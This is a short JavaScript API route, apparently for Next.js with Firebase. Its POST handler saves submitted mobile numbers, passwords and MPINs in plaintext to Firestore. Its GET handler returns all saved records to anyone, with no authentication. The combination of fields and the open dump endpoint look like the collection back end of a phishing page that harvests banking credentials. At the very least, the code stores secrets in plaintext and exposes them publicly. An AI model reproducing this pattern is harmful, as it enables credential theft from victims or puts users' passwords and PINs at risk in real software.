import { db } from "@/lib/firebaseClient";
import { collection, addDoc, getDocs, query, orderBy } from "firebase/firestore";

export async function POST(req) {
  try {
    const { mobile, password, mpin } = await req.json();
    await addDoc(collection(db, "users"), {
      Mobile: mobile,
      Password: password,
      Mpin: mpin,
      Date: new Date().toISOString(),
    });

    return new Response(JSON.stringify({ success: true, message: "Data saved to Firebase!" }), { status: 200 });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

export async function GET() {
  try {
    const q = query(collection(db, "users"), orderBy("Date", "desc"));
    const snapshot = await getDocs(q);
    const data = snapshot.docs.map(doc => doc.data());

    return new Response(JSON.stringify({ success: true, data }), { status: 200 });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}
